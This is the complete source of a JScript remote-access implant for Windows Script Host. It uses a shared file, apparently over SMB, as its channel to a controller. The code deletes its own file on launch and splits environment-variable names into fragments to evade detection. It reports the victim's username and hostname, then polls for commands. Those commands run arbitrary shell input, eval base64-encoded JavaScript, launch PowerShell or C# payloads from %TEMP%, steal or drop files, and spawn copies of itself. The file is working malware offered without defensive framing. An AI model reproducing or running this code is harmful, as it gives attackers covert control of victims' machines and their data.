//Define variables
var home = 'C:\\users\\localadmin\\desktop\\bridge.txt' // UNC or local path. Send and receive data through this file
var sleepytime = 3000 //in milliseconds

var runner = new ActiveXObject("WScript.Shell")
var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
var cs = runner.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
var un = runner.ExpandEnvironmentStrings("%US"+  "ER"+"NA"+  "ME%");
var hn = runner.ExpandEnvironmentStrings("%COM" + "PUT"  +"ERN" + "AME%");
var id = Math.floor(Math.random() * 9999999999).toString()
var type = "js"

var runextra = false
var extrafunc = []

//Find file we are running in
var selfpath = WScript.ScriptFullName
var fso = new ActiveXObject("Scripting.FileSystemObject")
if(fso.FileExists(selfpath))
{
  try
  {
    //Read data from self script file
    var fd = fso.OpenTextFile(selfpath)
    var selfdata = fd.ReadAll();
    fd.close()
    //Delete our own script file
    fso.DeleteFile(selfpath, true)
  }
  catch (e) {};
}

function smb_post(home, response) {
  var fdr = fso.OpenTextFile(home)
  var updata = fdr.ReadAll()
  fdr.close()

  if(updata !== checkin+"\r\n") { // Windows adds a \r\n at the end of file reads
    var fdw = fso.OpenTextFile(home, 2) // mode 2 = write
//    WScript.Echo("smb: Downstream Recieved: " + updata)
//    WScript.Echo("smb: Downstream Sending: " + response)
    fdw.WriteLine(response)
    fdw.close()
    return updata.split("\r")[0]
  }
  else {
    return false
  }
}

function writebinfile(filename, content) {
  var stream = WScript.CreateObject("ADODB.Stream")
  stream.Open()	
  stream.Type = 1 //adTypeBinary
  stream.Write(content)
  stream.SaveToFile(filename)
  stream.Close()
}

function readbinfile(filename) {
  var stream = WScript.CreateObject("ADODB.Stream")
  stream.Open()
  stream.Type = 1 //adTypeBinary
  stream.LoadFromFile(filename)
  var bytes = stream.Read()
  stream.Close()
  return bytes
}

function str2bin(data) {
   var istream = WScript.CreateObject("ADODB.Stream");
   istream.Type = 2
   istream.CharSet = "us-ascii"
   istream.Open()
   istream.WriteText(data)
   istream.Position = 0
   istream.Type = 1
   return istream.Read()
}
function b64e(data) {
  var xml = WScript.CreateObject("MSXml2.DOMDocument");
  var element = xml.createElement("Base64Data");
  element.dataType = "bin.base64";
  if(typeof(data) == "string") {
    element.nodeTypedValue = str2bin(data);
  }
  else {
    element.nodeTypedValue = data;
  }
  return element.text.replace(/\n/g, "");
}

function bin2str(data) {
  var istream = WScript.CreateObject("ADODB.Stream")
  istream.Type = 1
  istream.Open()
  istream.Write(data)
  istream.Position = 0
  istream.Type = 2
  istream.CharSet = "us-ascii"
  return istream.ReadText()
}

function b64d(data, type) {
  var xml = WScript.CreateObject("MSXml2.DOMDocument");
  var element = xml.createElement("Base64Data");
  element.dataType = "bin.base64"
  element.text = data
  if(type == "bin") {
    return element.nodeTypedValue
  }
  else {
    return bin2str(element.nodeTypedValue)
  }
}

//Main
var checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //initial checkin
if((fso.FileExists(home))) {
  fso.DeleteFile(home)
}
var fd = fso.CreateTextFile(home)
fd.close()
var fdw = fso.OpenTextFile(home, 2) // mode 2 = write
fdw.WriteLine(checkin) // write checkin for the first time
fdw.close()

while(true)
{
  //try
  //{
    var retval = ""
    var recv_package = false
    //WScript.Echo("smb: sending checkin: "+checkin)
    var jsondata = smb_post(home, checkin);
    //WScript.Echo("smb: got jsondata frm srv: "+jsondata)
    if(!jsondata) { // if no message from upstream rat, just wait and try again
      WScript.Sleep(sleepytime)
      continue
    }
    // Convert json string to json object
    eval("jsObject="+jsondata);
    checkin = '{ "p":[ ' // start building json response string

    // Supports running extra functions once per loop ... right before checking for cmnd
    if(runextra) {
      for(var i in extrafunc) {
        eval(extrafunc[i])
      }
    }

    // loop thru all packages 
    var packages = jsObject.p
    for(var p in packages) {
      if(packages[p].id == id) { // if this is our package (id = our id)
        recv_package = true
        if(packages[p].cmnd) {
          var rettype = "retval"
          var cmnd = packages[p].cmnd

          //kill
          if(cmnd == "quit") {
            if(fso.FileExists(selfpath)) {
              fso.DeleteFile(selfpath, true)
            }
            WScript.Quit(1);
          }

          //spawn: writes js to %TEMP%
          else if(cmnd == "spawn") {
            fd = fso.CreateTextFile(temp+"\\"+id+".js")
            fd.WriteLine(selfdata)
            fd.close()
            runner.Run(temp+"\\"+id+".js")
            retval = "[+] Spawn success..."
          }

          else if((cmnd.split(" ")[0] == "ev")) {
            eval(b64d(cmnd.split(" ")[1]))
            retval = "[*] eval complete..."
          }

          //psh and cs
          else if((cmnd.split(" ")[0] == "psh") || (cmnd.split(" ")[0] == "cs") || (cmnd.split(" ")[0] == "shc")) {
             fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
             msb = cmnd.split(" ")[1]
             msbdata = b64d(cmnd.split(" ")[2], "txt")
             fd.WriteLine(msbdata)
             fd.close()
             if(cmnd.split(" ")[0] == "shc") {
               runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
               retval = "[*] Shc cmnd appeared successful"
             }
             else {
               runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
             }
             if(fso.FileExists(temp + "\\__" + id + ".txt")) {
               fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
               retval = fd.ReadAll()
               fd.close()
               fso.DeleteFile(temp + "\\__" + id + ".txt", true)
             }
             if(fso.FileExists(temp + "\\" + id + ".txt")) {
               fso.DeleteFile(temp + "\\" + id + ".txt", true)
            }
          }
              
          else if(cmnd.split(" ")[0] == "dl") {
            var array = cmnd.split(" ")
            array.shift() //Cuts off the first element in the array
            var filepath = array.join(" ")
            if(fso.FileExists(filepath)) {
              retval = readbinfile(filepath)
              rettype = "dl"
            }
            else {
              retval = "[!] Could not read file: " + filepath
            }
          }

          else if(cmnd.split(" ")[0] == "up") {
            try {
              var array = cmnd.split(" ")
              content = b64d(array[1], "bin")
              array.shift()
              array.shift()
              filename = array.join(" ")
              writebinfile(filename, content)
              retval = "[*] File uploaded: " + filename
            }
            catch (e) {
              retval = "[-] Could not upload file: " + filename
            }
          }

          //credit to nate and 0sum
          else {
            runner.Run(cs +" /c " + cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
      	    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
              try {
                fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
                retval = fd.ReadAll()
                fd.close()
                fso.DeleteFile(temp + "\\__" + id + ".txt", true)
              }
              catch (e) { }
            }
          }
          if(retval == "") {
            retval = "[*] No results to return or error getting result data"
          }
          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'","'+rettype+'":"'+b64e(retval)+'"} ] }';
          packages[p].cmnd = "" // set cmnd to blank so we don't accidentally run the same thing twice ...
        } 

        else { // cmnd is blank
          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'"} ] }'; // idle response
        }
      }
    }
    if(!recv_package) {
      checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'"} ] }';
    }
  //}
  //catch (e) {
  //  WScript.Sleep(sleepytime);
  //}
  WScript.Sleep(sleepytime);
}

